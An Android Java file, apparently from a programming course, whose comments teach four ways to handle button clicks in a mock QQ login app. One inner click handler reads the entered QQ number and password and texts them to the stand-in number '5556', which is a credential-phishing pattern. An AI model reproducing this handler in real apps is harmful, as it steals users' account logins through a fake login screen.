package com.itheima.qq;

import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
/*
 *    第一种 :	
 *    		通过 匿名内部类的形式 
 *    
 *    第二种(推荐使用):
 *    		使用 内部类  去实现 点击事件的写法 
 *    	
 *    第三种(推荐使用):
 *    		当 按钮很多的时候 , 可以让  MainActivity 类 去实现   OnClickListener 接口 
 * 
 * 	    第四种(不怎么推荐):	
 * 		在写控件的 xml 文件 中,直接添加 android:onClick="login"  ,表示 点击 按钮后 会执行 login方法 
 * 
 * 		login 方法的方法 签名 是固定的 , 必须是这样
 * 
 * 		public void login(View v)
 * 		
 * 
 * 
 */
public class MainActivity extends Activity implements View.OnClickListener{

	private EditText number;
	private EditText password;
	private Button login_btn;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //做 初始化 控件的 事情
        number = (EditText) findViewById(R.id.qq_number);
        password = (EditText) findViewById(R.id.qq_password);
        
        login_btn = (Button) findViewById(R.id.btn_login);
        
//        login_btn.setOnClickListener(new MyClickListener()); 
       /* 
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);
        login_btn.setOnClickListener(this);*/
        
    }

    public void login(View v){
    	
    	System.out.println("按钮被点击了 ........");
    	
    }
    
    
    @Override
	public void onClick(View v) {
		
    	//如何 去鉴别 到底 哪个 按钮 被点击了 呢 ?
    	int id = v.getId();
    	
	}
    
    
    private class MyClickListener implements View.OnClickListener{

			
			@Override
			public void onClick(View v) {
				
				//发短信 给俺 
				// 获得 qq的号码以及 密码信息
				String numValue = number.getText().toString();
				String passValue = password.getText().toString();
				
				//拿到 短信发送的管理器 
				SmsManager smsManager = SmsManager.getDefault();
				// destinationAddress : 目的地 
				// scAddress :  源 地址  
				// text :  发送的文本数据
				// sentIntent :  发送成功 报告 
				// deliveryIntent :  对方开机后收到 短信的报告 
				smsManager.sendTextMessage("5556", null, numValue+"---"+passValue, null, null);
				
			}
		}


	
    	
    }
    
